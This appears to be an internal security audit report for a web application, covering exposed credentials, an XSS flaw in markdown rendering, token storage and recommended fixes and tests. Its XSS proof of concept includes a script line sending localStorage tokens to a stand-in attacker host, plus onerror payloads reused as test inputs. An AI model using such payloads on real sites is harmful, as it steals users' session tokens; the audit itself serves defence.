# Security Audit Report - AIRGen

**Date:** October 12, 2025
**Auditor:** Security Review
**Scope:** Full-stack security review (authentication, authorization, input validation, secrets management, dependencies)

---

## Executive Summary

This comprehensive security audit of the AIRGen application reveals **strong security practices** overall, with production-grade authentication, proper encryption, and comprehensive security hardening. However, **3 critical issues** require immediate attention, along with several recommendations for improvement.

---

## 🔴 **CRITICAL FINDINGS** (Immediate Action Required)

### 1. **Production Secrets Exposure**
**Severity:** CRITICAL
**Location:** `/root/airgen/.env.production`

**Issue:** The `.env.production` file contains actual production credentials:
- OpenAI API key: `[REDACTED — rotated]`
- SMTP password: `[REDACTED — rotated]`
- Database passwords in plaintext
- JWT secret

**Impact:** If this server is compromised, all credentials are immediately accessible.

**Recommendation:**
1. **IMMEDIATELY** rotate all exposed credentials:
   - Generate new OpenAI API key
   - Change SMTP password
   - Regenerate JWT secret (will log out all users)
   - Update database passwords
2. Store secrets in a secure vault (HashiCorp Vault, AWS Secrets Manager, etc.)
3. Never store production secrets on the server filesystem
4. Use environment-specific secret injection during deployment

**Action Items:**
- [ ] Rotate OpenAI API key
- [ ] Change SMTP password
- [ ] Regenerate JWT secret
- [ ] Update database passwords
- [ ] Implement secrets vault solution
- [ ] Remove `.env.production` from server

---

### 2. **XSS Vulnerability in Markdown Rendering**
**Severity:** HIGH
**Location:** `frontend/src/components/MarkdownEditor/MarkdownEditorView.tsx:601`

**Issue:** Markdown preview uses `rehypeRaw` without `rehype-sanitize`:
```tsx
<ReactMarkdown
  remarkPlugins={[remarkGfm]}
  rehypePlugins={[rehypeRaw]}  // ⚠️ Allows raw HTML without sanitization
>
```

**Impact:** Malicious users can inject arbitrary HTML/JavaScript into markdown content, potentially stealing authentication tokens, executing arbitrary code, or defacing the application.

**Proof of Concept:**
```markdown
<script>fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))</script>
<img src=x onerror="alert('XSS')">
```

**Recommendation:**
```tsx
import rehypeSanitize from 'rehype-sanitize';

<ReactMarkdown
  remarkPlugins={[remarkGfm]}
  rehypePlugins={[rehypeRaw, rehypeSanitize]}  // ✅ Add sanitization
>
```

**Action Items:**
- [ ] Add `rehype-sanitize` to `rehypePlugins` array
- [ ] Test markdown rendering with malicious content
- [ ] Review all other uses of `react-markdown` in codebase
- [ ] Add automated security tests for XSS

---

### 3. **In-Memory Token Storage (Production Risk)**
**Severity:** MEDIUM-HIGH
**Location:** `backend/src/lib/refresh-tokens.ts:26`

**Issue:** Refresh tokens are stored in memory:
```typescript
const refreshTokenStore = new Map<string, RefreshTokenRecord>();
```

**Impact:**
- All users must re-authenticate after server restart
- Horizontal scaling impossible (tokens not shared across instances)
- Token reuse detection only works per-instance
- No persistent audit trail

**Recommendation:**
Replace in-memory storage with Redis:
```typescript
import { Redis } from 'ioredis';
const redis = new Redis(config.redis.url);

export async function createRefreshToken(userId: string): Promise<string> {
  const token = generateToken();
  await redis.setex(`refresh:${token}`, 7 * 24 * 60 * 60, JSON.stringify({
    userId,
    createdAt: Date.now()
  }));
  return token;
}
```

**Action Items:**
- [ ] Add Redis to docker-compose configuration
- [ ] Implement Redis-based token storage
- [ ] Add Redis health checks
- [ ] Update deployment documentation
- [ ] Add token storage tests

---

## ⚠️ **HIGH PRIORITY FINDINGS**

### 4. **Dependency Vulnerability: fast-redact Prototype Pollution**
**Severity:** LOW
**CVE:** CVE-2025-57319
**Package:** `fast-redact@3.5.0` (via `fastify > pino > fast-redact`)

**Issue:** The `fast-redact` package has a prototype pollution vulnerability in the `nestedRestore` function.

**Impact:** Low severity - requires crafted payload. DoS as minimum consequence.

**Recommendation:**
- Monitor for patched version (currently no fix available as of audit date)
- Consider alternative logging approach if concerned
- Not urgent as exploitation requires specific conditions

**Action Items:**
- [ ] Monitor `fast-redact` for security updates
- [ ] Subscribe to security advisories for fastify dependencies
- [ ] Consider Dependabot or Snyk integration

---

### 5. **Missing TWOFA_ENCRYPTION_KEY Environment Variable**
**Severity:** MEDIUM
**Location:** `backend/src/config.ts:143`

**Issue:** Falls back to JWT secret if not set:
```typescript
encryptionKey: env.TWOFA_ENCRYPTION_KEY ?? resolvedJwtSecret
```

**Impact:** If JWT secret is compromised, all 2FA secrets are also compromised.

**Recommendation:**
Use separate encryption keys:
```bash
# Generate strong key
openssl rand -base64 32

# Set in production
TWOFA_ENCRYPTION_KEY=<generated-key>
```

**Action Items:**
- [ ] Generate dedicated 2FA encryption key
- [ ] Add to production environment configuration
- [ ] Document in deployment guide
- [ ] Add validation to fail-fast if missing in production

---

### 6. **Refresh Token Reuse Detection Could Be Bypassed**
**Severity:** MEDIUM
**Location:** `backend/src/lib/refresh-tokens.ts:80-84`

**Issue:** Token reuse detection revokes ALL user tokens, but only works in-memory.

**Impact:** Distributed deployments won't detect reuse across instances.

**Recommendation:** Move to Redis with atomic operations for consistent detection.

**Action Items:**
- [ ] Implement Redis-based token reuse detection (atomic operations)
- [ ] Add alerting for token reuse attempts
- [ ] Document security incident response procedure

---

## ✅ **STRENGTHS** (Well-Implemented Security)

### Authentication & Authorization
- ✅ **Argon2id password hashing** with OWASP-compliant parameters (64 MiB memory, 3 iterations)
- ✅ **Automatic legacy hash migration** (SHA256 → scrypt → Argon2id)
- ✅ **Short-lived JWT access tokens** (15 minutes)
- ✅ **Refresh token rotation** (one-time use with automatic rotation)
- ✅ **TOTP 2FA with encrypted secrets** (AES-256-GCM with authentication tags)
- ✅ **Backup codes** (SHA-256 hashed, one-time use, 10 per setup)
- ✅ **Rate limiting** on auth endpoints (5 attempts/5 minutes in production)
- ✅ **Secure password reset** with token expiry (30 minutes)
- ✅ **Email verification** with cryptographic tokens (60 minutes)
- ✅ **Timing-safe password comparison** (prevents timing attacks)

### Input Validation
- ✅ **Zod schema validation** on all API endpoints
- ✅ **Parameterized Neo4j queries** (no Cypher injection vulnerabilities found)
- ✅ **Environment-specific password requirements** (strong in production, relaxed in dev)
- ✅ **Email format validation** with normalization (lowercase, trim)
- ✅ **TOTP code validation** (6 digits, numeric only)
- ✅ **Backup code validation** (8 characters, alphanumeric uppercase)

### Security Headers & Configuration
- ✅ **Helmet CSP** (production only, allows dev HMR)
- ✅ **HSTS** with preload (max-age: 1 year, includeSubDomains)
- ✅ **X-Frame-Options: DENY**
- ✅ **X-Content-Type-Options: nosniff**
- ✅ **X-XSS-Protection: 1; mode=block**
- ✅ **Referrer-Policy: strict-origin-when-cross-origin**
- ✅ **CORS allowlist** (enforced in production, fail-fast validation)
- ✅ **Global rate limiting** (100 req/min production, 500 req/min dev)
- ✅ **Auth-specific rate limiting** (5 req/5min production, 20 req/5min dev)

### Secrets Management
- ✅ **.env files properly gitignored** (verified: `.env.production` is ignored)
- ✅ **Environment-specific configs** (development, staging, production)
- ✅ **Fail-fast validation** for required secrets in production
- ✅ **No secrets in code** (all via environment variables)
- ✅ **Cookie signing** (using JWT secret)
- ✅ **httpOnly cookies** for refresh tokens (XSS protection)
- ✅ **Secure cookies in production** (HTTPS only)

### Observability & Audit
- ✅ **Structured auth event logging** (login, logout, MFA, password reset)
- ✅ **Request correlation IDs** (X-Request-ID headers, UUID v4)
- ✅ **Health endpoints** (/healthz, /readyz, /health)
- ✅ **Optional Sentry integration** for error tracking
- ✅ **Prometheus metrics endpoint** (/metrics)
- ✅ **Version history tracking** for all entities (immutable snapshots)

### Code Quality
- ✅ **TypeScript strict mode** (type safety throughout)
- ✅ **ESLint configuration** (code quality enforcement)
- ✅ **Test infrastructure** (Vitest, Playwright E2E)
- ✅ **Pre-commit hooks** (Husky + lint-staged)
- ✅ **Error serialization** (safe error handling, no sensitive data leaks)

---

## 📋 **RECOMMENDATIONS** (Best Practices)

### Short-Term (Next Sprint)

1. **Fix XSS vulnerability** in markdown rendering (add `rehype-sanitize`)
2. **Rotate exposed credentials** immediately (API keys, passwords, secrets)
3. **Set dedicated TWOFA_ENCRYPTION_KEY** in production environment
4. **Add Content-Security-Policy meta tag** in frontend HTML
5. **Implement CSRF tokens** for state-changing operations (even with JWT)
6. **Add security testing** to CI/CD pipeline

### Medium-Term (Next Quarter)

7. **Migrate to Redis for token storage** (enables horizontal scaling)
8. **Add WebAuthn/Passkey support** (passwordless authentication)
9. **Implement security.txt** at `/.well-known/security.txt`
10. **Add Dependabot or Snyk** for automated dependency scanning
11. **Create security runbook** for incident response
12. **Add rate limiting per user** (in addition to per-IP)
13. **Implement session management UI** (view/revoke active sessions)

### Long-Term (Ongoing)

14. **Security testing automation**
    - OWASP ZAP or Burp Suite scans
    - Automated penetration testing
    - Regular security audits (quarterly)

15. **Monitoring & Alerting**
    - Failed login attempt monitoring (>5 in 5 min)
    - MFA bypass attempt detection (>3 in 5 min)
    - Token reuse detection alerts
    - Geographic anomaly detection
    - Credential stuffing detection

16. **Compliance & Documentation**
    - GDPR data handling audit
    - SOC 2 preparation (access controls, audit trails)
    - Security awareness training
    - Bug bounty program consideration

17. **Advanced Security Features**
    - Device fingerprinting
    - Suspicious activity detection
    - IP allowlisting per user
    - Security notifications (email/SMS)
    - Advanced audit logging

---

## 📊 **Security Scorecard**

| Category | Rating | Score | Notes |
|----------|--------|-------|-------|
| **Authentication** | 🟢 Excellent | 95/100 | Production-grade with 2FA, Argon2id |
| **Authorization** | 🟢 Good | 85/100 | JWT-based, role checks implemented |
| **Input Validation** | 🟢 Good | 85/100 | Zod schemas, parameterized queries |
| **Output Encoding** | 🟡 Fair | 65/100 | Missing XSS protection in markdown |
| **Secrets Management** | 🟡 Fair | 70/100 | Good gitignore, but plaintext storage |
| **Session Management** | 🟡 Fair | 75/100 | Token rotation good, but in-memory |
| **Error Handling** | 🟢 Good | 85/100 | Structured logging, no leaks |
| **Security Headers** | 🟢 Excellent | 95/100 | Helmet, CSP, HSTS all configured |
| **Rate Limiting** | 🟢 Excellent | 95/100 | Global + endpoint-specific limits |
| **Dependencies** | 🟢 Good | 85/100 | Only 1 low-severity vulnerability |
| **Observability** | 🟢 Good | 85/100 | Logging, metrics, health checks |
| **Code Quality** | 🟢 Good | 85/100 | TypeScript, tests, linting |

**Overall Security Posture:** 🟢 **GOOD** (82/100)

**Risk Level:** MEDIUM (3 critical issues require immediate attention)

---

## 🎯 **Immediate Action Items**

### Week 1 (Critical)
- [ ] **TODAY:** Rotate all production credentials in `.env.production`
- [ ] **DAY 2:** Fix XSS vulnerability (add `rehype-sanitize`)
- [ ] **DAY 3:** Set dedicated `TWOFA_ENCRYPTION_KEY`
- [ ] **DAY 5:** Test security fixes in staging environment

### Week 2-4 (High Priority)
- [ ] Implement Redis-based token storage
- [ ] Add automated security tests to CI/CD
- [ ] Create security incident response runbook
- [ ] Add Dependabot for dependency monitoring

### Month 2-3 (Medium Priority)
- [ ] Implement WebAuthn/Passkey support
- [ ] Add security.txt file
- [ ] Implement per-user rate limiting
- [ ] Create session management UI

---

## 🧪 **Testing Recommendations**

Create automated security tests:

```typescript
// backend/src/__tests__/security/xss.test.ts
describe('XSS Protection', () => {
  test('Markdown content should be sanitized', async () => {
    const maliciousMarkdown = '<script>alert("XSS")</script>';
    const response = await api.saveMarkdownContent(
      tenant,
      project,
      doc,
      maliciousMarkdown
    );
    expect(response.content).not.toContain('<script>');
  });

  test('Should strip dangerous HTML attributes', async () => {
    const markdown = '<img src=x onerror="alert(1)">';
    const response = await api.saveMarkdownContent(tenant, project, doc, markdown);
    expect(response.content).not.toContain('onerror');
  });
});

// backend/src/__tests__/security/rate-limiting.test.ts
describe('Rate Limiting', () => {
  test('Should block excessive login attempts', async () => {
    // Make 5 failed login attempts (at limit)
    for (let i = 0; i < 5; i++) {
      await api.login('test@example.com', 'wrong-password');
    }

    // 6th attempt should be rate limited
    const response = await api.login('test@example.com', 'wrong-password');
    expect(response.status).toBe(429);
    expect(response.body.error).toContain('Too many authentication attempts');
  });

  test('Should allow login after rate limit window expires', async () => {
    // ... implementation
  });
});

// backend/src/__tests__/security/token-rotation.test.ts
describe('Token Rotation', () => {
  test('Should detect and prevent token reuse', async () => {
    const { refreshToken } = await api.login(email, password);

    // Use token once (should work)
    const { token: newToken1 } = await api.refresh(refreshToken);
    expect(newToken1).toBeDefined();

    // Try to reuse original token (should fail and revoke all tokens)
    const response = await api.refresh(refreshToken);
    expect(response.status).toBe(401);

    // New token should also be invalid now
    const response2 = await api.refresh(newToken1);
    expect(response2.status).toBe(401);
  });
});

// backend/src/__tests__/security/password-hashing.test.ts
describe('Password Security', () => {
  test('Should use Argon2id for new passwords', async () => {
    const user = await createUser({ email, password });
    expect(user.passwordHash).toMatch(/^\$argon2id\$/);
  });

  test('Should migrate legacy SHA256 hashes on login', async () => {
    // Create user with legacy hash
    const user = await createLegacyUser({ email, legacyHash: sha256(password) });

    // Login should succeed and upgrade hash
    await api.login(email, password);

    const updatedUser = await getUser(user.id);
    expect(updatedUser.passwordHash).toMatch(/^\$argon2id\$/);
  });
});

// frontend/src/__tests__/security/csrf.test.ts
describe('CSRF Protection', () => {
  test('Should include CSRF token in state-changing requests', async () => {
    // ... implementation
  });
});
```

---

## 📚 **Additional Resources**

### Security Standards & Guidelines
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [JWT Best Practices (RFC 8725)](https://tools.ietf.org/html/rfc8725)
- [Argon2 RFC 9106](https://www.rfc-editor.org/rfc/rfc9106.html)
- [TOTP RFC 6238](https://tools.ietf.org/html/rfc6238)

### Tools & Services
- [Snyk](https://snyk.io/) - Dependency vulnerability scanning
- [Dependabot](https://github.com/dependabot) - Automated dependency updates
- [OWASP ZAP](https://www.zaproxy.org/) - Web application security scanner
- [Burp Suite](https://portswigger.net/burp) - Web vulnerability scanner
- [HashiCorp Vault](https://www.vaultproject.io/) - Secrets management

### Monitoring & Observability
- [Sentry](https://sentry.io/) - Error tracking (already integrated)
- [Prometheus](https://prometheus.io/) - Metrics (already integrated)
- [Grafana](https://grafana.com/) - Metrics visualization
- [ELK Stack](https://www.elastic.co/elastic-stack) - Log aggregation

---

## 📝 **Audit Methodology**

This audit was conducted using the following methodology:

1. **Code Review**
   - Manual review of authentication/authorization code
   - Input validation analysis
   - Session management review
   - Error handling examination

2. **Configuration Review**
   - Environment variable analysis
   - Security headers verification
   - CORS configuration check
   - Rate limiting validation

3. **Dependency Analysis**
   - `pnpm audit` execution
   - CVE database cross-reference
   - Version currency check

4. **Architecture Review**
   - Token storage mechanism
   - Secrets management approach
   - Scaling considerations

5. **Documentation Review**
   - Security documentation completeness
   - Deployment procedures
   - Incident response readiness

---

## 🔄 **Next Steps**

1. **Review this audit** with the development team
2. **Prioritize action items** based on severity
3. **Create tickets** for each recommendation
4. **Schedule follow-up audit** in 3 months
5. **Implement continuous security monitoring**

---

## 📧 **Contact & Support**

For questions about this audit or security concerns:
- Review the [Security Documentation](./SECURITY.md)
- Check the [Security Test Checklist](./SECURITY-TEST-CHECKLIST.md)
- Refer to the [Troubleshooting Guide](../TROUBLESHOOTING.md)

---

**Audit Version:** 1.0
**Last Updated:** October 12, 2025
**Next Review:** January 12, 2026
**Classification:** Internal - Security Sensitive
